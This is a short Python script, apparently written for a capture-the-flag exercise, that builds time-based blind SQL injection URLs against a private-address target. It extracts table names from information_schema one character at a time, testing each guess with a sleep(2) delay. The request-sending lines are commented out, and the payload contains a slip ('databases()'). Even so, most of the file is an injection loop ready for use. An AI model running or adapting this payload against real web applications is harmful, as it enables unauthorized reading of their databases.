import string
import base64


# b=string.printable

# print(b)
# c=base64.b64encode(b.encode()).decode()


# print(c)
# d=b'123'
# e=base64.b64encode(d)
# print(e)


#--------------------------------------------------------------------------------------
import requests
import time 
# a=string.ascii_letters+string.digits
# print(a)
url="http://10.10.10.10/?id=1'or'"
flag=""
a="select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(databases()))"
for i in range (1,128):
#for i in range(1,128,1):#指定步长，能调间隔，不调的话默认是1👆
    for c in string.ascii_letters+string.digits+'_-{}':
        print(c)
        d=url+f"(if((ord(mid({a},{i},1))"+f"like({ord(c)})),sleep(2),1))--+"
        print(d)
        time.sleep(5)
        # try:
        #     print(d)
        #     requests.get(d,timeout=1.8,verify=False)
        # except:
        #     flag=flag+c
        #     print(flag)
#--------------------------------------------------------------------------------------
# 
#            